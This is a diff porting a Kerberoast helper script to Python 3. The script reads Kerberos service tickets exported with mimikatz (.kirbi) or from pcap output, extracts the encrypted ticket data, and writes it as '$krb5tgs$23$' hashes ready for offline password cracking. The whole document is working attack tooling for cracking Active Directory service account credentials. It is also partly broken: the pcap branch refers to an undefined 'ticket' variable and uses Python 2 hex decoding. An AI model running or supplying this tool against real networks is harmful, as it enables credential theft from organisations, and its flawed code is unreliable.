@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 # Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
 # from a kirbi file (https://github.com/nidem/kerberoast).
@@ -19,31 +19,47 @@
 # limitations under the License
 
 from pyasn1.codec.ber import decoder
-import sys
+
+
+def extract_ticket_from_kirbi(filename):
+    with open(filename, 'rb') as fd:
+        data = fd.read()
+        return extract_ticket(data)
+
+def extract_ticket(data):
+    if data[0] == 0x76:
+        # ram dump 
+        #enctickets.append(((decoder.decode(data)[0][2][0][3][2]).asOctets(), i, f))
+        return (decoder.decode(data)[0][2][0][3][2]).asOctets()
+    elif data[:2] == b'6d':
+        # honestly, i completely forgot. I think this is from a pcap -Tim
+        #enctickets.append(((decoder.decode(ticket.decode('hex'))[0][4][3][2]).asOctets(), i, f))
+        return (decoder.decode(ticket.decode('hex'))[0][4][3][2]).asOctets()
 
 if __name__ == '__main__':
-    m = "exported mimikatz kerberos tickets / extracttgsrepfrompcap.py output"
+    import argparse
+    import sys
 
-    if len(sys.argv) < 2:
-        sys.stderr.write("Usage: %s <%s>\n" % (sys.argv[0], m))
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description='Read Mimikatz kerberos ticket then modify it and save it in crack_file')
+    parser.add_argument('-o', dest='crack_file', metavar='crack_file', type=argparse.FileType('w'), default=sys.stdout, nargs='?',
+                    help='File to save crackable output to (default is stdout')
+    parser.add_argument('files', nargs='+', metavar='file.kirbi', type=str,
+                    help='File name to crack.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')
 
-    for f in sys.argv[1:]:
-        with open(f, 'rb') as fd:
-            data = fd.read()
-            if data[0] == '\x76':  # process .kirbi
-                # rem dump
-                etype = str(decoder.decode(data)[0][2][0][3][0])
-                if etype != "23":
-                    sys.stderr.write("Unsupported etype %s seen! Please report this to us.\n" % etype)
-                et = str(decoder.decode(data)[0][2][0][3][2])
-                sys.stdout.write("$krb5tgs$unknown:$krb5tgs$%s$" % etype + et[:16].encode("hex") +
-                                 "$" + et[16:].encode("hex") + "\n")
-            elif data[:2] == '6d':  # extracttgsrepfrompcap.py output
-                for ticket in data.strip().split('\n'):
-                    etype = str(decoder.decode(ticket.decode('hex'))[0][4][3][0])
-                    if etype != "23":
-                        sys.stderr.write("Unsupported etype %s found. Such hashes can't be cracked it seems.\n" % etype)
-                    et = str(decoder.decode(ticket.decode('hex'))[0][4][3][2])
-                    sys.stdout.write("$krb5tgs$unknown:$krb5tgs$%s$" % etype + et[:16].encode("hex") +
-                                     "$" + et[16:].encode("hex") + "\n")
+    args = parser.parse_args()
+
+    enctickets = []
+
+    for filename in args.files:
+        et = extract_ticket_from_kirbi(filename)
+        if et:
+            enctickets.append((et,filename))
+
+    #out=open("crack_file","wb")
+    for et in enctickets:
+        filename = et[1].split('/')[-1].split('\\')[-1].replace('.kirbi','')
+
+        out = '$krb5tgs$23$*' + filename + '*$' + et[0][:16].hex() + '$' +et[0][16:].hex() + '\n'
+
+        args.crack_file.writelines(out)
+    sys.stderr.write('tickets written: ' + str(len(enctickets)) + '\n')
